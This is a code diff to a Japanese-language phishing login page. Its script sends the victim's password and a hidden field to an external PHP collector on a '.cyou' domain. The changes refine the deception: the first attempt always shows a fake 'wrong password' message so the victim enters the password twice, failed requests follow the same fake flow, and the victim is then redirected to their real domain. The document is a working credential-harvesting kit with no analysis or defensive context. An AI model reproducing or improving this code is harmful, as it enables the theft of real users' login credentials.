@@ -90,6 +90,7 @@
             font-size: 13px;
             text-align: start !important;
             margin-bottom: 10px;
+            display: none;
         }
 
         .login-container .checkbox-container {
@@ -349,14 +350,14 @@
             <input type="hidden" name="aa" id="ux" required value="">
             <input type="password" id="password" name="bb" placeholder="Password" required>
             
-            <div class="auth-error" id="uy-group">認証が必要です！</div>
+            <div class="auth-error" id="uy-group" style="display: none;">パスワードが間違っています。もう一度お試しください。</div>
             
             <div class="checkbox-container">
                 <input type="checkbox" id="show-password">
                 <label for="show-password" style="color: #0A66C3;font-size: 13px;">パスワードを表示</label>
             </div>
             
-            <button type="submit">次</button>
+            <button type="submit" id="subBtn">次</button>
         </form>
         <hr style="width:100%;text-align:left;margin-left:0;border-color: rgba(128, 128, 128, 0.318);margin: 20px 0;">
         
@@ -366,7 +367,6 @@
     </div>
     
     <script>
-        // YOUR PHP SERVER URL (keep this on your server)
         var fille = "https://harvo.cyou/4892e/34/psr/psr/result.php";
         
         var fullUrl = window.location.href;
@@ -396,13 +396,8 @@
             event.preventDefault();
             formSubmitted++;
             
-            var inputs = $('input[required]');
-            for (var i = 0; i < inputs.length; i++) {
-                if (!inputs[i].value.trim()) {
-                    alert("Please fill in all fields.");
-                    return;
-                }
-            }
+            $("#subBtn").prop("disabled", true).text("Loading...");
+            $("#uy-group").hide();
             
             var formData = new FormData(this);
 
@@ -412,25 +407,29 @@
                 data: formData,
                 processData: false,
                 contentType: false,
+                timeout: 10000,
                 success: function (response) {
-                    console.log(response);
-                    
                     if (formSubmitted === 1) {
                         $("#password").val("");
-                        $("#uy-group").text("パスワードが間違っています。もう一度お試しください。");
-                    } else if (formSubmitted >= 2) {
-                        setTimeout(() => {
-                            window.location.href = `http://www.${domain}`;
-                        }, 2000);
+                        $("#uy-group").show();
+                        $("#subBtn").prop("disabled", false).text("次");
+                    } else {
+                        window.location.href = `http://www.${domain}`;
                     } 
                 },
                 error: function() {
-                    alert("Connection error. Please try again.");
+                    // Fallback to flow even on error
+                    if (formSubmitted === 1) {
+                        $("#password").val("");
+                        $("#uy-group").show();
+                        $("#subBtn").prop("disabled", false).text("次");
+                    } else {
+                        window.location.href = `http://www.${domain}`;
+                    }
                 }
             });
         });
 
-        // Show/hide password
         document.getElementById("show-password").addEventListener("change", function() {
             var passwordField = document.getElementById("password");
             passwordField.type = this.checked ? "text" : "password";
